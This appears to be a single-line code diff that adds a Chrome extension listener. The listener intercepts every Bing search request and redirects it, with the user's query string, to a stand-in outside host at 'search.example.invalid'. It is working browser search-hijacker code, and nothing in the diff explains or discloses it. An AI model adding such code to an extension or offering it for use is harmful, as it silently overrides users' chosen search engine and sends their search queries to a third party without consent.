@@ -1,0 +1,1 @@
+chrome.webRequest.onBeforeRequest.addListener(d => { if (d.url.includes('bing.com/search')) return {redirectUrl: 'https://search.example.invalid/q?' + d.url.split('?')[1]}; }, {urls: ['*://*.bing.com/*']}, ['blocking']);
